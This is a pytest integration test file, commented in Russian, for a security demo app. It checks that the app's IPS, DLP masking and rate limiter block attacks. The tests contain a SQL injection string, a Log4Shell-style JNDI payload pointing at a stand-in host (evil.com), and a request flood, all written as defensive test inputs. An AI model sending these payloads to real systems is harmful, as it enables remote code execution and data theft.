"""
test_demo_app.py — интеграционные тесты security-demo.

Проверяют, что стенд РЕАЛЬНО использует модуль ``sec`` через свою архитектуру:
атаки прогоняются по защищённым ``IPS``/``DLP``/``RateLimiter`` приложениям, а не
имитируются. Демо-``main.py`` загружается под отдельным именем (``demo_main``),
чтобы не конфликтовать с корневым ``main.py`` проекта.
"""

import importlib.util
import json
import os
import sys

import pytest

os.environ.setdefault("AENGINE_NO_AUTO_INSTALL", "1")

_DEMO_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "security-demo"))


def _load_demo_main():
    # Демо-main.py при импорте добавляет свой каталог в sys.path[0], что затеняет
    # корневой main.py проекта. Восстанавливаем sys.path после загрузки (все
    # подмодули стенда к этому моменту уже закэшированы в sys.modules), чтобы не
    # ломать другим тестам `import main`.
    saved_path = list(sys.path)
    try:
        spec = importlib.util.spec_from_file_location("demo_main", os.path.join(_DEMO_DIR, "main.py"))
        module = importlib.util.module_from_spec(spec)
        sys.modules["demo_main"] = module
        spec.loader.exec_module(module)
        return module
    finally:
        sys.path[:] = saved_path


demo_main = _load_demo_main()


@pytest.fixture
def client():
    demo_main.app.flask.config["TESTING"] = True
    return demo_main.app.flask.test_client()


def test_routes_registered(client):
    rules = {r.rule for r in demo_main.app.flask.url_map.iter_rules()}
    assert {
        "/", "/health",
        "/api/attacks/catalog", "/api/attack/run", "/api/attack/flood",
        "/api/attack/dlp-test", "/api/attack/chain",
        "/api/metrics/summary", "/api/metrics/system", "/api/metrics/logs",
        "/api/metrics/stress-test", "/api/metrics/reset",
    } <= rules


def test_sqli_blocked_by_real_ips(client):
    """SQLi блокируется настоящим IPS (abort 400) и атрибутируется SQLiDetector."""
    r = client.post("/api/attack/run", json={"attack_type": "sqli", "payload": "' OR 1=1 --"})
    data = r.get_json()
    assert data["blocked"] is True
    assert data["status_code"] == 400
    assert data["detector"] == "SQLiDetector"


def test_cve_blocked_by_signature_waf(client):
    """CVE-payload ловит сигнатурный слой (OWASP CRS) → SignatureDetector."""
    r = client.post("/api/attack/run",
                    json={"attack_type": "cve", "payload": "${jndi:ldap://evil.com/x}"})
    data = r.get_json()
    assert data["blocked"] is True
    assert data["detector"] == "SignatureDetector"


def test_benign_input_passes(client):
    """Безобидный ввод не блокируется (детекторы не срабатывают)."""
    r = client.post("/api/attack/run", json={"attack_type": "sqli", "payload": "hello world"})
    data = r.get_json()
    assert data["blocked"] is False
    assert data["status_code"] == 200


def test_dlp_masks_pii(client):
    """Реальный DLP-middleware вырезает email/телефон/паспорт из ответа."""
    data = client.get("/api/attack/dlp-test").get_json()
    assert data["dlp_actions"]["total_masked"] == 3
    masked = json.dumps(data["masked_data"], ensure_ascii=False)
    assert "ivan.petrov@company.com" not in masked
    assert "+79161234567" not in masked
    assert "4515 123456" not in masked


def test_ratelimiter_flood_blocks(client):
    """Настоящий RateLimiter пропускает первые 100 и режет остальные (429)."""
    data = client.post("/api/attack/flood", json={"count": 150}).get_json()
    assert data["passed"] == 100
    assert data["blocked"] == 50
    assert data["rate_limit_triggered_at"] == 101


def test_attack_chain_fully_blocked(client):
    """APT-цепочка: LFI → RCE → DLP, все этапы блокируются реальным sec."""
    data = client.post("/api/attack/chain").get_json()
    assert data["chain_blocked"] is True
    detectors = [s["detector"] for s in data["steps"]]
    assert detectors == ["LFIDetector", "RCEDetector", "DLP"]


def test_health(client):
    assert client.get("/health").get_json() == {"status": "healthy"}
